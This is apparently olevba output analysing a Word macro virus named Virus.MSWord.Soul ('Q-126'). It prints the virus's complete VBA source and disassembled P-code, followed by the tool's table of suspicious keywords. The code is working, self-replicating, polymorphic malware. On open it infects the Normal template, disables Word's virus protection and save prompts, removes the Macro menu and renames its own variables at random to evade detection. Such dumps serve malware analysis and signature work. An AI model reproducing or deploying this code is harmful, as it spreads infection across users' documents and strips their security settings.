olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Soul
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Soul - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim ôÙŒóÝþ™îíÎ(16, 2) As String
Private Sub Document_New()
Call Document_Open
End Sub

Private Sub Document_Open()
Const ï§Åè»åÃÍŽïé = "ActiveDocument"
On Error Resume Next
Select Case ï§Åè»åÃÍŽïé
Case "ActiveDocument"
    Set ˆ�¸í«¹°ÌÔ÷­± = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set àÓœÂð£Šúá°ÅÇ = NormalTemplate.VBProject.VBComponents(1).CodeModule
Case "NormalTemplate"
    Set àÓœÂð£Šúá°ÅÇ = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set ˆ�¸í«¹°ÌÔ÷­± = NormalTemplate.VBProject.VBComponents(1).CodeModule
    If Day(Date) < 5 Then
    MsgBox "Q-126 infection", vbCritical, "Q-126"
    End If
End Select
SetAttr (NormalTemplate.Name), vbNormal
CommandBars("Tools").Controls("Macro").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "me") = "Q-126 Virus" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "version") = "2.45" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "date") = "20/05/1999" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "Polymorph") = "(10..14)*126" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "author") = "Lord Soulblighter" '‡Á´û‚Ñ„‘¤‹×íï
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "origin") = "Belgium" 'Chr
If àÓœÂð£Šúá°ÅÇ.Countoflines > 100 Then
Exit Sub
Else
Call Ï«š«õ–”»ÄË·ó(àÓœÂð£Šúá°ÅÇ, ˆ�¸í«¹°ÌÔ÷­±)
NormalTemplate.Save
End If
End Sub
Private Sub Document_Close()
End Sub
Private Function Ï«š«õ–”»ÄË·ó(ByVal ˆà´¹ë²½ßø­, ¯�Ïˆ…ÉœÆ¤®ì®)
Dim »çà™ÎŒöí‹´ØŽ, ‡Á´û‚Ñ„‘¤‹×íï, ÷±ÁÓž¾¼ãìóß�Â As Integer
Dim ‰Ûá•Úå‰þÕõµ As String
ôÙŒóÝþ™îíÎ(1, 1) = "ôÙŒóÝþ™îíÎ"
ôÙŒóÝþ™îíÎ(2, 1) = "ï§Åè»åÃÍŽïé"
ôÙŒóÝþ™îíÎ(3, 1) = "ˆ�¸í«¹°ÌÔ÷­±"
ôÙŒóÝþ™îíÎ(4, 1) = "àÓœÂð£Šúá°ÅÇ"
ôÙŒóÝþ™îíÎ(5, 1) = "Ï«š«õ–”»ÄË·ó"
ôÙŒóÝþ™îíÎ(6, 1) = "ˆà´¹ë²½ßø­"
ôÙŒóÝþ™îíÎ(7, 1) = "¯�Ïˆ…ÉœÆ¤®ì®"
ôÙŒóÝþ™îíÎ(8, 1) = "»çà™ÎŒöí‹´ØŽ"
ôÙŒóÝþ™îíÎ(9, 1) = "‡Á´û‚Ñ„‘¤‹×íï"
ôÙŒóÝþ™îíÎ(10, 1) = "÷±ÁÓž¾¼ãìóß�Â"
ôÙŒóÝþ™îíÎ(11, 1) = "‰Ûá•Úå‰þÕõµ"
ôÙŒóÝþ™îíÎ(12, 1) = "÷Ž¬ñ¢îªÖ–Öñ"
ôÙŒóÝþ™îíÎ(13, 1) = "‘æŸö’ —³Ü‚•˜¯"
ôÙŒóÝþ™îíÎ(14, 1) = "Ü¥ªùŠ¹Ì³�ôõñý"
ôÙŒóÝþ™îíÎ(15, 1) = "éû¥æä�òùå£ê¶"
ôÙŒóÝþ™îíÎ(16, 1) = "…è›„ì�¨ýüÝÝ"
For ‡Á´û‚Ñ„‘¤‹×íï = 1 To 16
    ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 2) = ‘æŸö’ —³Ü‚•˜¯
Next ‡Á´û‚Ñ„‘¤‹×íï
‡Á´û‚Ñ„‘¤‹×íï = ˆà´¹ë²½ßø­.Countoflines
For »çà™ÎŒöí‹´ØŽ = 1 To ‡Á´û‚Ñ„‘¤‹×íï
    ˆà´¹ë²½ßø­.…è›„ì�¨ýüÝÝLine »çà™ÎŒöí‹´ØŽ, "'"
Next »çà™ÎŒöí‹´ØŽ
‡Á´û‚Ñ„‘¤‹×íï = ˆà´¹ë²½ßø­.Countoflines
For ÷±ÁÓž¾¼ãìóß�Â = 1 To ¯�Ïˆ…ÉœÆ¤®ì®.Countoflines
‰Ûá•Úå‰þÕõµ = ¯�Ïˆ…ÉœÆ¤®ì®.Lines(÷±ÁÓž¾¼ãìóß�Â, 1)
   Select Case ‰Ûá•Úå‰þÕõµ
   Case "Const ï§Åè»åÃÍŽïé = ""ActiveDocument"""
       ‰Ûá•Úå‰þÕõµ = "Const ï§Åè»åÃÍŽïé = ""NormalTemplate"""
   Case "Const ï§Åè»åÃÍŽïé = ""NormalTemplate"""
       ‰Ûá•Úå‰þÕõµ = "Const ï§Åè»åÃÍŽïé = ""ActiveDocument"""
   Case "'"
       GoTo éû¥æä�òùå£ê¶
   End Select
   ˆà´¹ë²½ßø­.InsertLines (‡Á´û‚Ñ„‘¤‹×íï + ÷±ÁÓž¾¼ãìóß�Â), …è›„ì�¨ýüÝÝ(‰Ûá•Úå‰þÕõµ)
éû¥æä�òùå£ê¶:
Next ÷±ÁÓž¾¼ãìóß�Â
End Function
Private Function …è›„ì�¨ýüÝÝ(Ü¥ªùŠ¹Ì³�ôõñý As String)
Dim ‰Ûá•Úå‰þÕõµ As String
Dim ÷Ž¬ñ¢îªÖ–Öñ As Boolean
Dim ÷±ÁÓž¾¼ãìóß�Â, ‡Á´û‚Ñ„‘¤‹×íï As Integer
For ‡Á´û‚Ñ„‘¤‹×íï = 1 To 16
÷Ž¬ñ¢îªÖ–Öñ = True
While ÷Ž¬ñ¢îªÖ–Öñ = True
  ÷Ž¬ñ¢îªÖ–Öñ = False
  For ÷±ÁÓž¾¼ãìóß�Â = 1 To (Len(Ü¥ªùŠ¹Ì³�ôõñý) - Len(ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1)) + 1)
    ‰Ûá•Úå‰þÕõµ = Mid(Ü¥ªùŠ¹Ì³�ôõñý, ÷±ÁÓž¾¼ãìóß�Â, Len(ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1)))
    If ‰Ûá•Úå‰þÕõµ = ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1) Then
      Ü¥ªùŠ¹Ì³�ôõñý = Left(Ü¥ªùŠ¹Ì³�ôõñý, ÷±ÁÓž¾¼ãìóß�Â - 1) & ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 2) & Right(Ü¥ªùŠ¹Ì³�ôõñý, Len(Ü¥ªùŠ¹Ì³�ôõñý) - ÷±ÁÓž¾¼ãìóß�Â - Len(ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1)) + 1)
      ÷Ž¬ñ¢îªÖ–Öñ = True
    End If
 Next ÷±ÁÓž¾¼ãìóß�Â
Wend
Next ‡Á´û‚Ñ„‘¤‹×íï
…è›„ì�¨ýüÝÝ = Ü¥ªùŠ¹Ì³�ôõñý
End Function
Private Function ‘æŸö’ —³Ü‚•˜¯()
Dim ÷±ÁÓž¾¼ãìóß�Â As Integer
‘æŸö’ —³Ü‚•˜¯ = ""
Randomize
÷±ÁÓž¾¼ãìóß�Â = Int((4 * Rnd) + 10)
While Len(‘æŸö’ —³Ü‚•˜¯) < ÷±ÁÓž¾¼ãìóß�Â
    Randomize
    ‘æŸö’ —³Ü‚•˜¯ = ‘æŸö’ —³Ü‚•˜¯ + Chr(Int((126 * Rnd) + 129))
Wend
End Function






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Soul
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8106 bytes
' Line #0:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0010 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	VarDefn ôÙŒóÝþ™îíÎ (As String)
' Line #1:
' 	FuncDefn (Private Sub Document_New())
' Line #2:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Document_Open())
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000E "ActiveDocument"
' 	VarDefn ï§Åè»åÃÍŽïé
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	Ld ï§Åè»åÃÍŽïé 
' 	SelectCase 
' Line #9:
' 	LitStr 0x000E "ActiveDocument"
' 	Case 
' 	CaseDone 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ˆ�¸í«¹°ÌÔ÷­± 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set àÓœÂð£Šúá°ÅÇ 
' Line #12:
' 	LitStr 0x000E "NormalTemplate"
' 	Case 
' 	CaseDone 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set àÓœÂð£Šúá°ÅÇ 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ˆ�¸í«¹°ÌÔ÷­± 
' Line #15:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Lt 
' 	IfBlock 
' Line #16:
' 	LitStr 0x000F "Q-126 infection"
' 	Ld vbCritical 
' 	LitStr 0x0005 "Q-126"
' 	ArgsCall MsgBox 0x0003 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	EndSelect 
' Line #19:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #24:
' 	LitStr 0x000B "Q-126 Virus"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0002 "me"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x005A 0x000D "÷±ÁÓž¾¼ãìóß�Â"
' Line #25:
' 	LitStr 0x0004 "2.45"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0007 "version"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0058 0x000D "÷±ÁÓž¾¼ãìóß�Â"
' Line #26:
' 	LitStr 0x000A "20/05/1999"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0004 "date"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x005B 0x000D "÷±ÁÓž¾¼ãìóß�Â"
' Line #27:
' 	LitStr 0x000C "(10..14)*126"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0009 "Polymorph"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0062 0x000D "÷±ÁÓž¾¼ãìóß�Â"
' Line #28:
' 	LitStr 0x0011 "Lord Soulblighter"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0006 "author"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0064 0x000D "‡Á´û‚Ñ„‘¤‹×íï"
' Line #29:
' 	LitStr 0x0007 "Belgium"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0006 "origin"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x005A 0x0003 "Chr"
' Line #30:
' 	Ld àÓœÂð£Šúá°ÅÇ 
' 	MemLd Countoflines 
' 	LitDI2 0x0064 
' 	Gt 
' 	IfBlock 
' Line #31:
' 	ExitSub 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld àÓœÂð£Šúá°ÅÇ 
' 	Ld ˆ�¸í«¹°ÌÔ÷­± 
' 	ArgsCall (Call) Ï«š«õ–”»ÄË·ó 0x0002 
' Line #34:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Private Sub Document_Close())
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Private Function Ï«š«õ–”»ÄË·ó(ByVal ˆà´¹ë²½ßø­, ¯�Ïˆ…ÉœÆ¤®ì®, id_FFFE As Variant))
' Line #40:
' 	Dim 
' 	VarDefn »çà™ÎŒöí‹´ØŽ
' 	VarDefn ‡Á´û‚Ñ„‘¤‹×íï
' 	VarDefn ÷±ÁÓž¾¼ãìóß�Â (As Integer)
' Line #41:
' 	Dim 
' 	VarDefn ‰Ûá•Úå‰þÕõµ (As String)
' Line #42:
' 	LitStr 0x000A "ôÙŒóÝþ™îíÎ"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #43:
' 	LitStr 0x000B "ï§Åè»åÃÍŽïé"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #44:
' 	LitStr 0x000C "ˆ�¸í«¹°ÌÔ÷­±"
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #45:
' 	LitStr 0x000C "àÓœÂð£Šúá°ÅÇ"
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #46:
' 	LitStr 0x000C "Ï«š«õ–”»ÄË·ó"
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #47:
' 	LitStr 0x000A "ˆà´¹ë²½ßø­"
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #48:
' 	LitStr 0x000C "¯�Ïˆ…ÉœÆ¤®ì®"
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #49:
' 	LitStr 0x000C "»çà™ÎŒöí‹´ØŽ"
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #50:
' 	LitStr 0x000D "‡Á´û‚Ñ„‘¤‹×íï"
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #51:
' 	LitStr 0x000D "÷±ÁÓž¾¼ãìóß�Â"
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #52:
' 	LitStr 0x000B "‰Ûá•Úå‰þÕõµ"
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #53:
' 	LitStr 0x000B "÷Ž¬ñ¢îªÖ–Öñ"
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #54:
' 	LitStr 0x000D "‘æŸö’ —³Ü‚•˜¯"
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #55:
' 	LitStr 0x000D "Ü¥ªùŠ¹Ì³�ôõñý"
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #56:
' 	LitStr 0x000C "éû¥æä�òùå£ê¶"
' 	LitDI2 0x000F 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #57:
' 	LitStr 0x000B "…è›„ì�¨ýüÝÝ"
' 	LitDI2 0x0010 
' 	LitDI2 0x0001 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #58:
' 	StartForVariable 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #59:
' 	Ld ‘æŸö’ —³Ü‚•˜¯ 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	LitDI2 0x0002 
' 	ArgsSt ôÙŒóÝþ™îíÎ 0x0002 
' Line #60:
' 	StartForVariable 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	Ld ˆà´¹ë²½ßø­ 
' 	MemLd Countoflines 
' 	St ‡Á´û‚Ñ„‘¤‹×íï 
' Line #62:
' 	StartForVariable 
' 	Ld »çà™ÎŒöí‹´ØŽ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	For 
' Line #63:
' 	Ld »çà™ÎŒöí‹´ØŽ 
' 	LitStr 0x0001 "'"
' 	Ld ˆà´¹ë²½ßø­ 
' 	ArgsMemCall …è›„ì�¨ýüÝÝLine 0x0002 
' Line #64:
' 	StartForVariable 
' 	Ld »çà™ÎŒöí‹´ØŽ 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	Ld ˆà´¹ë²½ßø­ 
' 	MemLd Countoflines 
' 	St ‡Á´û‚Ñ„‘¤‹×íï 
' Line #66:
' 	StartForVariable 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ¯�Ïˆ…ÉœÆ¤®ì® 
' 	MemLd Countoflines 
' 	For 
' Line #67:
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	LitDI2 0x0001 
' 	Ld ¯�Ïˆ…ÉœÆ¤®ì® 
' 	ArgsMemLd Lines 0x0002 
' 	St ‰Ûá•Úå‰þÕõµ 
' Line #68:
' 	Ld ‰Ûá•Úå‰þÕõµ 
' 	SelectCase 
' Line #69:
' 	LitStr 0x0024 "Const ï§Åè»åÃÍŽïé = "ActiveDocument""
' 	Case 
' 	CaseDone 
' Line #70:
' 	LitStr 0x0024 "Const ï§Åè»åÃÍŽïé = "NormalTemplate""
' 	St ‰Ûá•Úå‰þÕõµ 
' Line #71:
' 	LitStr 0x0024 "Const ï§Åè»åÃÍŽïé = "NormalTemplate""
' 	Case 
' 	CaseDone 
' Line #72:
' 	LitStr 0x0024 "Const ï§Åè»åÃÍŽïé = "ActiveDocument""
' 	St ‰Ûá•Úå‰þÕõµ 
' Line #73:
' 	LitStr 0x0001 "'"
' 	Case 
' 	CaseDone 
' Line #74:
' 	GoTo éû¥æä�òùå£ê¶ 
' Line #75:
' 	EndSelect 
' Line #76:
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	Add 
' 	Paren 
' 	Ld ‰Ûá•Úå‰þÕõµ 
' 	ArgsLd …è›„ì�¨ýüÝÝ 0x0001 
' 	Ld ˆà´¹ë²½ßø­ 
' 	ArgsMemCall InsertLines 0x0002 
' Line #77:
' 	Label éû¥æä�òùå£ê¶ 
' Line #78:
' 	StartForVariable 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	EndFunc 
' Line #80:
' 	FuncDefn (Private Function …è›„ì�¨ýüÝÝ(Ü¥ªùŠ¹Ì³�ôõñý As String, id_FFFE As Variant))
' Line #81:
' 	Dim 
' 	VarDefn ‰Ûá•Úå‰þÕõµ (As String)
' Line #82:
' 	Dim 
' 	VarDefn ÷Ž¬ñ¢îªÖ–Öñ (As Boolean)
' Line #83:
' 	Dim 
' 	VarDefn ÷±ÁÓž¾¼ãìóß�Â
' 	VarDefn ‡Á´û‚Ñ„‘¤‹×íï (As Integer)
' Line #84:
' 	StartForVariable 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #85:
' 	LitVarSpecial (True)
' 	St ÷Ž¬ñ¢îªÖ–Öñ 
' Line #86:
' 	Ld ÷Ž¬ñ¢îªÖ–Öñ 
' 	LitVarSpecial (True)
' 	Eq 
' 	While 
' Line #87:
' 	LitVarSpecial (False)
' 	St ÷Ž¬ñ¢îªÖ–Öñ 
' Line #88:
' 	StartForVariable 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Ü¥ªùŠ¹Ì³�ôõñý 
' 	FnLen 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	LitDI2 0x0001 
' 	ArgsLd ôÙŒóÝþ™îíÎ 0x0002 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	For 
' Line #89:
' 	Ld Ü¥ªùŠ¹Ì³�ôõñý 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	LitDI2 0x0001 
' 	ArgsLd ôÙŒóÝþ™îíÎ 0x0002 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	St ‰Ûá•Úå‰þÕõµ 
' Line #90:
' 	Ld ‰Ûá•Úå‰þÕõµ 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	LitDI2 0x0001 
' 	ArgsLd ôÙŒóÝþ™îíÎ 0x0002 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	Ld Ü¥ªùŠ¹Ì³�ôõñý 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	LitDI2 0x0002 
' 	ArgsLd ôÙŒóÝþ™îíÎ 0x0002 
' 	Concat 
' 	Ld Ü¥ªùŠ¹Ì³�ôõñý 
' 	Ld Ü¥ªùŠ¹Ì³�ôõñý 
' 	FnLen 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	Sub 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	LitDI2 0x0001 
' 	ArgsLd ôÙŒóÝþ™îíÎ 0x0002 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St Ü¥ªùŠ¹Ì³�ôõñý 
' Line #92:
' 	LitVarSpecial (True)
' 	St ÷Ž¬ñ¢îªÖ–Öñ 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	StartForVariable 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	Wend 
' Line #96:
' 	StartForVariable 
' 	Ld ‡Á´û‚Ñ„‘¤‹×íï 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	Ld Ü¥ªùŠ¹Ì³�ôõñý 
' 	St …è›„ì�¨ýüÝÝ 
' Line #98:
' 	EndFunc 
' Line #99:
' 	FuncDefn (Private Function ‘æŸö’ —³Ü‚•˜¯(id_FFFE As Variant))
' Line #100:
' 	Dim 
' 	VarDefn ÷±ÁÓž¾¼ãìóß�Â (As Integer)
' Line #101:
' 	LitStr 0x0000 ""
' 	St ‘æŸö’ —³Ü‚•˜¯ 
' Line #102:
' 	ArgsCall Read 0x0000 
' Line #103:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x000A 
' 	Add 
' 	FnInt 
' 	St ÷±ÁÓž¾¼ãìóß�Â 
' Line #104:
' 	Ld ‘æŸö’ —³Ü‚•˜¯ 
' 	FnLen 
' 	Ld ÷±ÁÓž¾¼ãìóß�Â 
' 	Lt 
' 	While 
' Line #105:
' 	ArgsCall Read 0x0000 
' Line #106:
' 	Ld ‘æŸö’ —³Ü‚•˜¯ 
' 	LitDI2 0x007E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0081 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St ‘æŸö’ —³Ü‚•˜¯ 
' Line #107:
' 	Wend 
' Line #108:
' 	EndFunc 
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

